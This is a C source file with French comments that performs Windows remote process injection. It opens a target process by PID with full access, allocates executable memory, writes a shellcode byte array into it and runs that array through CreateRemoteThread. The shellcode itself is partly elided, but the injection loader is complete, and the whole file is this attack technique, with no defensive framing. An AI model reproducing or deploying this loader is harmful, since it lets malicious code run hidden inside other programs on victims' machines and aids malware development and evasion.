#include "stdafx.h"
#include "Windows.h"

int main(int argc, char* argv[])
{
    // Le shellcode est une séquence d'instructions machine représentée sous forme de tableau d'octets.
    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
        // ...
        "\x2b\x90\xe1\xec";

    HANDLE gestionnaireProcessus;
    HANDLE threadDistant;
    PVOID tamponDistant;

    printf("Injection dans le PID : %i", atoi(argv[1]));

    // Ouverture du processus cible avec des privilèges d'accès complets.
    gestionnaireProcessus = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // Allocation d'un tampon mémoire dans le processus cible.
    tamponDistant = VirtualAllocEx(gestionnaireProcessus, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // Copie du shellcode dans le tampon mémoire du processus cible.
    WriteProcessMemory(gestionnaireProcessus, tamponDistant, shellcode, sizeof(shellcode), NULL);

    // Création d'un thread distant qui exécute le code du shellcode dans le processus cible.
    threadDistant = CreateRemoteThread(gestionnaireProcessus, NULL, 0, (LPTHREAD_START_ROUTINE)tamponDistant, NULL, 0, NULL);

    // Fermeture du gestionnaire du processus cible.
    CloseHandle(gestionnaireProcessus);

    return 0;
}
